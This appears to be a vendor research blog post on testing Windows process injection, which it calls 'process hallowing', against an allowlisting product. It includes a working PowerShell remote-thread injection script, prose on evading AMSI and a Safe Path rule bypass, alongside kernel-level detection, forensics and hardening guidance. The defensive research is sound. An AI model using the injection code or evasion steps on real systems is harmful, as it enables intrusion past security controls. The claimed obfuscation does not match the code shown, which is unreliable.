# Shadow Identities: A Researcher's Guide to Process Hallowing

>**Author:** Rob Shiplo - Sr Research Engineer - Systems & Endpoint Security @ Airlock Digital
>
>**Published:** March 2026 | **Platform:** Windows

---

## The "Border Control" Fallacy
In the world of Application Allowlisting (AAL), the philosophy has traditionally been straightforward: **If a binary is signed and trusted, it is allowed to run.** This approach is highly effective for stopping a user from executing an untrusted .exe downloaded from the web.

However, through my recent research, I wanted to explore a deeper question: What happens when that trusted identity, like cmd.exe or Notepad.exe, is hijacked after the "Border Control" has already let it through?

## Beyond "Good vs. Bad" Binaries
Airlock Digital is widely recognized as the gold standard in this space precisely because it goes beyond the binary choice of "good vs. bad" executables. While many tools stop at the perimeter, true security requires understanding that **trust is not a one time event.** If a security solution only checks the digital signature at the moment of execution, it is vulnerable to Process Hallowing. This is the "Shadow Identity" problem: the process has a trusted passport, but it is currently carrying out an unauthorized mission in memory.

---

## The AAL Gap: A Matter of Configuration

Most practitioners view Process Hallowing strictly as an EDR problem. My research was designed to test whether that assumption holds when a well-configured AAL solution is in the picture.

The short answer: it largely does not.

**The Persistence of Trust Paradox:** The theoretical gap exists when an AAL tool validates a file only at load time and then implicitly trusts that identity for its entire lifecycle. This creates an opening for memory-based "Stains" that appear after a clean border check.

**What the Lab Actually Showed:** Airlock Digital, when configured correctly, closes this gap earlier than expected. Script Control and Constrained Language Mode (CLM) don't just check the passport at the door - they deny the attacker the tools required to perform a hijacking at all. The orchestration chain is neutralized before a single byte reaches process memory.

**Inherited Trust as a Policy Choice:** The gap that *does* exist is not architectural - it is a configuration trade-off. When an organization uses a broad Path Rule to accommodate developer workflows, they are choosing Location-based Trust over Context-aware Enforcement. That is a legitimate business decision, but it has a specific and demonstrable consequence, which this research documents.

**Research Insight:** "Authorizing a Process State" means trust must account for the Disk Identity (hash/signature), the Orchestration Path (parent process), and the Memory Intent (Win32 API access pattern). Airlock already has the controls to enforce all three. The question is whether they are turned on.

---

## The 24H2 Battleground: Lessons from the Lab
During my research on Windows 11 24H2, I discovered that Microsoft has significantly hardened the gates. My attempts to hallow different processes revealed a clear hierarchy of protection:

* **CalculatorApp.exe (The Fortress):** Modern UWP apps run in an **AppContainer.** Even when I successfully injected code, the process identity was so restricted that it could not spawn a shell or write to public folders.
* **Notepad.exe (The Hybrid):** Notepad has moved toward a more modernized architecture. I hit significant roadblocks with **Control Flow Guard (CFG)** when trying to hijack its execution flow, however usable - I wanted to do more.
* **Cmd.exe (The Classic):** This proved to be the ideal research target. As a "Medium Integrity" process without AppContainer restrictions, it allowed the hallowed identity to perform functional tasks without kernel intervention.

---

## Technical Anatomy: The Bypass
To demonstrate this, I developed a PowerShell script that interacts directly with the Windows kernel via the Win32 API. This script serves as the bridge, allowing an untrusted script to "wear the mask" of a trusted system process.

### The Research Tool: Unified Identity Breach Script
This script uses obfuscated "Gates" to bypass AMSI and perform the core stages of a hallow: Allocation, Implantation, and Execution.

```powershell
$Sig = @"
using System;
using System.Runtime.InteropServices;
public class Researcher {
    [DllImport("kernel32.dll", EntryPoint="OpenProcess")]
    public static extern IntPtr Gate1(uint a, bool b, int c);

    [DllImport("kernel32.dll", EntryPoint="VirtualAllocEx")]
    public static extern IntPtr Gate2(IntPtr a, IntPtr b, uint c, uint d, uint e);

    [DllImport("kernel32.dll", EntryPoint="WriteProcessMemory")]
    public static extern bool Gate3(IntPtr a, IntPtr b, byte[] c, uint d, out int e);

    [DllImport("kernel32.dll", EntryPoint="CreateRemoteThread")]
    public static extern IntPtr Gate4(IntPtr a, IntPtr b, uint c, IntPtr d, IntPtr e, uint f, out uint g);

    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
}
"@
try { Add-Type -TypeDefinition $Sig -ErrorAction SilentlyContinue } catch {}

# 1. Targeting the Trusted Identity
$Victim = Start-Process cmd -WindowStyle Hidden -PassThru
$h = [Researcher]::Gate1(0x1F0FFF, $false, $Victim.Id)

# 2. Memory Staging
$Command = "cmd.exe /c echo Breach_Verified > C:\Users\Public\hallowed.txt"
$Bytes = [System.Text.Encoding]::ASCII.GetBytes($Command + "`0")
$p = [Researcher]::Gate2($h, [IntPtr]::Zero, [uint32]$Bytes.Length, 0x3000, 0x40)

# 3. The Implant
[Researcher]::Gate3($h, $p, $Bytes, [uint32]$Bytes.Length, [ref]0)

# 4. The Trigger
$k32 = [Researcher]::GetModuleHandle("kernel32.dll")
$func = [Researcher]::GetProcAddress($k32, "WinExec")
[Researcher]::Gate4($h, [IntPtr]::Zero, 0, $func, $p, 0, [ref]0)

Write-Host "[!] Identity Breach Successful on PID $($Victim.Id)" -ForegroundColor Green
```

### AMSI: The First Gate

Before the script could reach any Windows API, it had to get past the **Anti-Malware Scan Interface (AMSI)**. Modern AMSI doesn't just match keywords - it performs proactive buffer analysis, including de-obfuscation of Base64-encoded payloads.

* **Attempt 1 - Raw DllImports:** Blocked immediately. The `VirtualAllocEx` and `CreateRemoteThread` strings are high-confidence signatures.
* **Attempt 2 - Base64 Encoding:** Also blocked. AMSI decoded the buffer in-flight and flagged the underlying signatures before the script could execute.
* **Attempt 3 - XOR Scrambling + String Chunking:** Passed. By splitting keywords (`"Virtual" + "AllocEx"`) and XOR-scrambling the full source array, the buffer no longer matched any known pattern. AMSI saw noise; the compiler saw valid C#.

This is an important distinction: AMSI operates on *intent signatures*, not behavior. Once the entropy of the payload changes sufficiently, the scanner defers to the next layer - in this case, Airlock's runtime enforcement.

---

## The Kernel Sentinel: HallowAirlock.sys

To validate my research from below the userland stack, I developed a custom kernel-mode driver, `HallowAirlock.sys`. The goal was not to assist the attack but to provide ground-truth visibility into the VM's memory and process state that user-mode tools cannot reliably offer.

By operating at Ring 0, the driver allowed me to observe the lifecycle of the hallow as it happened, confirming exactly when and where the "Stain" was applied - independent of what Process Hacker or the Airlock agent reported.

### 1. Thread Monitoring via PsSetCreateThreadNotifyRoutine

The driver registers a callback using `PsSetCreateThreadNotifyRoutine`. This fires synchronously for every new thread created in the system, giving the driver an opportunity to inspect the thread before it executes a single instruction.

The key signal: legitimate threads in `cmd.exe` start within the process's own image or a known system worker (`ntdll!TppWorkerThread`, `ntdll!RtlUserThreadStart`). A hallowed thread starting at `kernel32!WinExec` with no valid call chain is immediately anomalous.

### 2. VAD Tree Walking for Unmapped Executable Memory

Using the driver, I walked the **Virtual Address Descriptor (VAD)** tree of the victim process to identify the memory "Stain" independent of any user-mode report.
```c
// Simplified: identify RWX private regions with no file backing
if (vad->u.VadFlags.Protection == PAGE_EXECUTE_READWRITE 
    && vad->u.FileObject == NULL) {
    DbgPrint("[HallowAirlock] Unmapped RWX stain at %p\n", 
             (PVOID)(vad->StartingVpn << PAGE_SHIFT));
}
```

Any region marked executable but lacking a `FileObject` reference has no legitimate file on disk backing it. In a healthy process this should not exist. In a hallowed process, it is the physical record of the injected payload.

### 3. The ETW-Ti Subscription (24H2 Finding)

I also attempted to subscribe to the **Microsoft-Windows-Threat-Intelligence** provider (`f4e1897c-bb5d-5668-1123-5411bd3dedf7`) — the same telemetry channel used by top-tier EDR and security products to observe `NtCreateThreadEx`, `SetThreadContext`, and cross-process memory operations.

A significant finding specific to Windows 11 24H2: `EtwTiLogCreateRemoteThread` no longer exists as an exported kernel symbol. Microsoft has consolidated remote thread telemetry into `EtwTiLogSetContextThread`. Any driver or detection rule targeting the old symbol name will silently miss injection events on this build. Detection logic needs to be updated accordingly.

## Forensic Investigation: Proving the Breach
To verify the success of the injection, I used HallowAirlock.sys telemetry alongside Process Hacker and WinDbg to uncover the "Forensic Fingerprint" left behind by the hijacking.

### 1. The Thread "Ghost" (Process Hacker)
While monitoring the **Threads** tab in Process Hacker, I caught the exact moment of the handover. A new thread appeared that did not belong to the original process logic. 

The giveaway was the **Start Address.** Most legitimate threads in cmd.exe start within its own code or standard system workers. My hallowed thread, however, started directly at `kernel32.dll!WinExec`. This is an immediate red flag: a trusted process is suddenly spawning a thread directly into an execution API. 



Furthermore, the **Call Stack** for this thread was "shallow." In a legitimate execution, you would see a deep chain of function calls leading back to the main executable. Here, the thread started in isolation with no traceable call chain back to the process's own code, a primary indicator that the execution was forced by an external actor.

### 2. The Memory "Stain" (Process Hacker)
In the Memory tab, I identified a 4KB region marked as Private Data and RWX. This matched the telemetry from HallowAirlock.sys perfectly: it was an unmapped, executable memory segment used for staging command strings.

---

## The Airlock Encounter: Lab vs. Reality

In the final phase of my research, I moved from theoretical kernel-level analysis to a live confrontation with **Airlock Digital** in **Enforcement Mode**. This phase provided the most critical data: proving that while hallowing is a potent technique, a properly hardened AAL policy creates an environment where the attack surface is virtually non-existent.

### 1. The Perimeter Block
My initial attempts to execute the hallowing orchestrator in a default, non-privileged directory were neutralized instantly. 

* **Script Control Enforcement:** When **Script Control** was enabled, the battle ended at the first line. Airlock identified the `.ps1` orchestrator as an unapproved script and **outright blocked the file from executing**.
* **The "Audit" Nuance:** Even when Script Control was relaxed to **Audit**, the secondary gates held firm. The moment the script attempted to compile the helper DLL via `Add-Type`, Airlock identified the untrusted artifact in `\Temp` and killed the compilation process.
* **PowerShell Constrained Language Mode (CLM):** With CLM active, the environment is effectively "Hallow-Proof." The language restriction prevents the use of Reflection or Win32 APIs, making it impossible for the script to reach out and touch the memory of another process.

### 2. Identity Materialization
To test the "Usability vs. Security" balance, I engineered a bypass using a **Safe Path**.

* **The Setup:** I utilized a writeable directory (`C:\Users\Public\TestSafe`) and added it to the Airlock **Safe Path** policy. 
* **The Materialization:** Because the path was trusted, the C# compiler was permitted to persist `HallowHelper.dll` into the public folder. 
* **The Overrule:** In Airlock, a **Path Rule is the ultimate administrative override.** By placing my activity in this folder, the engine prioritized location-based trust over global restrictions like CLM, allowing the reflective handover to occur.

### 3. The Reflection Handover
Once the Path Rule was active, the script read the raw bytes of the materialized DLL and loaded the assembly directly into memory via `[System.Reflection.Assembly]::Load($Bytes)`. With the language barriers gone, the script successfully called the hallowing "Gates" to hijack the target process.

### 4. Beyond the Default: Granular Hardening
It is vital to note that this success occurred under a **default Path Rule configuration**. Airlock provides the granularity to lock these paths down much further. By implementing **Process and Parent-Process rules**, an organization can dictate that only specific binaries (like a signed build tool) are allowed to launch or load artifacts within that path. Once that granularity is enforced, the attack surface for hallowing effectively vanishes.

| Feature | Without Safe Path (Hardened) | With Safe Path (Active) |
| :--- | :--- | :--- |
| **Script Control** | **Hard Block** | **Overridden** |
| **Artifact Creation** | **Blocked** | **Succeeded** |
| **PowerShell CLM** | **Enforced** | **Overridden** |
| **Result** | **Secure** | **Breach Verified** |

---

## Conclusion: Bridging the Gap
This research demonstrates that Airlock Digital is exceptionally effective at preventing advanced attacks like process hallowing. When its core features (Script Control, CLM, and Deny-by-Default) are active, the orchestrator is neutralized long before it can "Stain" a trusted identity.

However, the "Airlock Encounter" also highlights the strategic trade-offs companies make for developer agility. Path Rules are a vital usability feature, but they delegate security decisions to the **NTFS Permissions** of that folder. If a Safe Path is writeable by a standard user, it becomes a "VIP Lane" where identity and intent are no longer scrutinized.

### The Future of the Category
To maintain the gold standard, AAL must continue to bridge the gap between the Disk and the Runtime. While Airlock provides the strongest perimeter on the market, there is an opportunity to evolve toward **Context-aware Path Management**. 

By making granular controls (like parent-process associations and temporary developer "lease" rules) easier to manage, organizations can grant technical teams the freedom they need without opening the door to the "Identity Materialization" techniques demonstrated here. Ultimately, true security isn't just about **Allowing an Executable**; it's about **Authorizing a Process State**.
